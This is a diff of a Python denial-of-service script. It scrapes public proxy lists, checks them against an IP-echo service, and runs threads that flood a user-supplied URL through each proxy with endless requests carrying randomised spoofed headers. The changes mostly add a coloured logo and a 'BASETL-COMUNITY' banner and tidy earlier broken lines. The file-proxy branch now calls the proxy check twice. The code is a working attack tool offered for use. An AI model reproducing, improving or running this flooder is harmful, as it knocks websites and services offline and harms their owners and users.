@@ -11,15 +11,17 @@ def clear():
 	
 os.system('clear')
 logo = """
-{Fore.RED}██▒▒   ██▒▒ ██▒▒   ██▒▒ ████▒▒    ██▒▒              ██████▒▒╗
-{Fore.RED}███▒▒ ██▒▒  ██▒▒   ██▒▒ ██▒██▒▒   ██▒▒            ██▒▒╔═╗██▒▒╗
-{Fore.RED}██▒▒██▒▒    ██▒▒   ██▒▒ ██▒▒██▒▒  ██▒▒           ██▒▒║   ║██▒▒║
-{Fore.RED}██▒██▒▒     ██▒▒   ██▒▒ ██▒▒ ██▒▒ ██▒▒ ██████▒▒ ██▒▒║   ║██▒▒║
-{Fore.RED}██▒▒██▒▒    ██▒▒   ██▒▒ ██▒▒  ██▒▒██▒▒           ██▒▒║██████▒▒║
-{Fore.RED}██▒▒ ██▒▒   ██▒▒   ██▒▒ ██▒▒   ██▒██▒▒           ██▒▒╔═══╗██▒▒║
-{Fore.RED}██▒▒  ██▒▒   ███████▒▒  ██▒▒    ████▒▒           ██▒▒║    ║██▒▒║
- \033[0m                                                               ╚═══╝    ╚════╝
+██▒▒   ██▒▒ ██▒▒   ██▒▒ ████▒▒    ██▒▒              ██████▒▒╗
+██▒▒  ██▒▒  ██▒▒   ██▒▒ ██▒██▒▒   ██▒▒            ██▒▒╔═╗██▒▒╗
+██▒▒██▒▒    ██▒▒   ██▒▒ ██▒▒██▒▒  ██▒▒           ██▒▒║   ║██▒▒║
+██▒██▒▒     ██▒▒   ██▒▒ ██▒▒ ██▒▒ ██▒▒ ██████▒▒ ██▒▒║   ║██▒▒║
+██▒▒██▒▒    ██▒▒   ██▒▒ ██▒▒  ██▒▒██▒▒           ██▒▒║██████▒▒║
+██▒▒ ██▒▒   ██▒▒   ██▒▒ ██▒▒   ██▒██▒▒           ██▒▒╔═══╗██▒▒║
+██▒▒  ██▒▒   ███████▒▒  ██▒▒    ████▒▒           ██▒▒║    ║██▒▒║
+                                                      ╚═══╝    ╚════╝
 """
+faded_text = fade.fire(logo)
+print(faded_text)
 def check_prox(array, url):
 	ip = r.post("http://ip.beget.ru/").text
 	for prox in array:
@@ -28,12 +30,6 @@ def check_prox(array, url):
 		thread_list.append(t)
 		t.start()
 
-while threading.active_count()>150 :
-    time.sleep(5)
-    Thread.start()
-def __init__(self):
-        print("init")
-	
 def check(ip, prox, url):
 	try:
 		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
@@ -47,7 +43,7 @@ def check(ip, prox, url):
 
 def ddos(prox, url):
 	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
-	colors ASCII
+	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
 	color = random.choice(colors)
 	while True:
 		headers = Headers(headers=True).generate()
@@ -61,7 +57,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-			print(color+"{}".format(prox))
+			print(color+"{}_proxy ".format(prox))
 	except:
 		pass
 
@@ -70,22 +66,26 @@ def start_ddos(prox, url, headers, proxies, color):
 @click.option('--url', '-u', help="URL")
 def main(proxy, url):
 	clear()
-	logo()
 	if url == None:
-		url = input("URL: ")
+		url = input("==⟩ URL: ")
 	if url[:4] != "http":
-		print("\033[91m[*]Enter the full URL (example: http*://****.**/)\033[0m")
+		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
 		exit()
 	if proxy == None:
 		while True:
 			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
 			array = req.text.split()
-			print("\033[33mFound {} new proxies\033[0m".format(len(array))
+			print("\033[92mBASETL-COMUNITY\033[0m")
+			print(Back.YELLOW + Fore.GREEN +" {}Found new proxies".format(len(array))+Style.RESET_ALL)
 			check_prox(array, url)
+			
+			
 	else:
 		try:
 			fx = open(proxy)
 			array = fx.read().split()
+			print("\033[92m" +str(url)+ "\033[33mBASETL-COMUNITY \033[0m")
+			check_prox(array, url)
 			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
 			check_prox(array, url)
 		except FileNotFoundError:
